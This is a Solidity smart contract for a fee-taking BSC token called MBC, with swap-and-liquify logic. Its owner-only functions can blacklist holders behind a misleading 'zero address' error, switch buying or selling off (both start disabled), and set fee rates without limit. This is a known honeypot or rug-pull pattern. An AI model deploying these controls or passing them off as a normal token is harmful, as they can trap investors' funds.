//coin12
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;
import "./dependencies.sol";

contract MBC is ERC20 {
    using SafeMath for uint256;
    IUniswapV2Router02 public uniswapV2Router;
    address public  uniswapV2Pair;
    address _tokenOwner;
	address _baseToken = address(0x55d398326f99059fF775485246999027B3197955);  // BUSD
    IERC20 public ETH;
    EthWarp warp;
    bool private swapping;
    uint256 public swapTokensAtAmount;
	uint256 _destroyMax;
	address private _destroyAddress = address(0x000000000000000000000000000000000000dEaD);
    address private _fundAddress = address(0xb926F44596D1FE4323C2dC207097FcEf5A94Cac7);
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
    mapping(address => bool) private _isExcludedFromVip;
    mapping(address => bool) public automatedMarketMakerPairs;
    bool public distribution = true;
    bool public swapAndLiquifyEnabled = true;
    uint256 public startTime;	
    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);
    event ExcludeFromFees(address indexed account, bool isExcluded);
    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);
    event SwapAndSendTo(
        address target,
        uint256 amount,
        string to
    );
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived
    );

    constructor(address tokenOwner) ERC20("MBC", "MBC") {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), address(_baseToken));  
		uint256 total = 10**23;    
		_destroyMax = total.sub(98 * 10**20);
        _approve(address(this), address(0x10ED43C718714eb63d5aA57B78B54704E256024E), total.mul(1000));
        ETH = IERC20(_baseToken);
        ETH.approve(address(0x10ED43C718714eb63d5aA57B78B54704E256024E),total.mul(1000));
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;
        _tokenOwner = tokenOwner;
        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);
        excludeFromFees(_owner, true);
        excludeFromFees(tokenOwner, true);
        excludeFromFees(address(this), true);
        _isExcludedFromVipFees[address(this)] = true;
        swapTokensAtAmount = total.div(10000); 
        _mint(tokenOwner, total);
    }

    receive() external payable {}

    function updateUniswapV2Router(address newAddress) public onlyOwner {
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }
	
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
    }
	function excludeFromVip(address account, bool excluded) public onlyOwner {
        _isExcludedFromVip[account] = excluded;
    }
	
    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFees[accounts[i]] = excluded;
        }
    }

    function setSwapTokensAtAmount(uint256 _swapTokensAtAmount) public onlyOwner {
        swapTokensAtAmount = _swapTokensAtAmount;
    }
	
	function changeSwapWarp(EthWarp _warp) public onlyOwner {
        warp = _warp;
        _isExcludedFromVipFees[address(warp)] = true;
    }

    function addOtherTokenPair(address _otherPair) public onlyOwner {
        _isExcludedFromVipFees[address(_otherPair)] = true;
    } 

    function changeDistribution() public onlyOwner {
        distribution = !distribution;
    }

    function warpWithdraw() public onlyOwner {
        warp.withdraw();
    }
	
	uint256 public ldxRate = 4;
	uint256 public deadRate = 3;
	uint256 public fundRate = 1;
	
	function changeRate(uint256 _ldxRate,uint256 _deadRate,uint256 _fundRate) public onlyOwner {
        ldxRate = _ldxRate;
		deadRate = _deadRate;
		fundRate = _fundRate;
    }
	
	bool public swapBuyStats;
	bool public swapSellStats;
	
	function changeSwapStats(bool _swapBuyStats,bool _swapSellStats) public onlyOwner {
        swapBuyStats = _swapBuyStats;
		swapSellStats = _swapSellStats;
    }

    function warpaddTokenldx(uint256 amount) public onlyOwner {
        warp.addTokenldx(amount);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
    }

    function _setAutomatedMarketMakerPair(address pairaddress, bool value) private {
        automatedMarketMakerPairs[pairaddress] = value;
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0) && !_isExcludedFromVip[from], "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount>0);

		if(_isExcludedFromVipFees[from] || _isExcludedFromVipFees[to]){
            super._transfer(from, to, amount);
            return;
        }
		
		bool isAddLdx;
        if(to == uniswapV2Pair){
            isAddLdx = _isAddLiquidityV1();
        }
		
        if(balanceOf(address(this)) > swapTokensAtAmount){
            if (
                !swapping &&
                _tokenOwner != from &&
                _tokenOwner != to &&
                from != uniswapV2Pair &&
                swapAndLiquifyEnabled &&
				!isAddLdx
            ) {
                swapping = true;
                swapAndLiquify();
                swapping = false;
            }
        }
		
        bool takeFee = !swapping;
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to] || _destroyMax <= balanceOf(_destroyAddress)) {
            takeFee = false;
        }else{
			if(from == uniswapV2Pair){
				require(swapBuyStats);
			}else if(to == uniswapV2Pair){
				require(swapSellStats);
				if(balanceOf(from) == amount){
					amount = amount.div(10000).mul(9999);
				}
			}else{
                takeFee = false;
            }
        }

        if (takeFee) {
			super._transfer(from, _destroyAddress, amount.div(100).mul(deadRate));
			super._transfer(from, address(this), amount.div(100).mul(ldxRate));
			super._transfer(from, _fundAddress, amount.div(100).mul(fundRate));
			amount = amount.div(100).mul(100 - fundRate - deadRate - ldxRate);
        }
        super._transfer(from, to, amount);
    }
	
	
    
	function swapAndLiquify() public {
		uint256 allAmount = balanceOf(address(this));
		if(allAmount > 10**18){
			uint256 canswap = allAmount.div(2);
			uint256 otherAmount = allAmount.sub(canswap);
			swapTokensForOther(canswap);
			uint256 ethBalance = ETH.balanceOf(address(this));
			addLiquidityUsdt(ethBalance, otherAmount);
		}
    }
	
    function swapTokensForOther(uint256 tokenAmount) public {
		address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(_baseToken);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(warp),
            block.timestamp
        );
        warp.withdraw();
    }
	

    function swapAndLiquifyStepv1() public {
        uint256 ethBalance = ETH.balanceOf(address(this));
        uint256 tokenBalance = balanceOf(address(this));
        addLiquidityUsdt(tokenBalance, ethBalance);
    }

    function addLiquidityUsdt(uint256 tokenAmount, uint256 usdtAmount) private {
        uniswapV2Router.addLiquidity(
            address(_baseToken),
			address(this),
            usdtAmount,
            tokenAmount,
            0,
            0,
            _tokenOwner,
            block.timestamp
        );
    }

    function rescueToken(address tokenAddress, uint256 tokens)
    public
    returns (bool success)
    {
        require(_tokenOwner == msg.sender);
        return IERC20(tokenAddress).transfer(msg.sender, tokens);
    }

	function _isAddLiquidityV1()internal view returns(bool ldxAdd){

        address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();
        address token1 = IUniswapV2Pair(address(uniswapV2Pair)).token1();
        (uint r0,uint r1,) = IUniswapV2Pair(address(uniswapV2Pair)).getReserves();
        uint bal1 = IERC20(token1).balanceOf(address(uniswapV2Pair));
        uint bal0 = IERC20(token0).balanceOf(address(uniswapV2Pair));
        if( token0 == address(this) ){
			if( bal1 > r1){
				uint change1 = bal1 - r1;
				ldxAdd = change1 > 1000;
			}
		}else{
			if( bal0 > r0){
				uint change0 = bal0 - r0;
				ldxAdd = change0 > 1000;
			}
		}
    }
}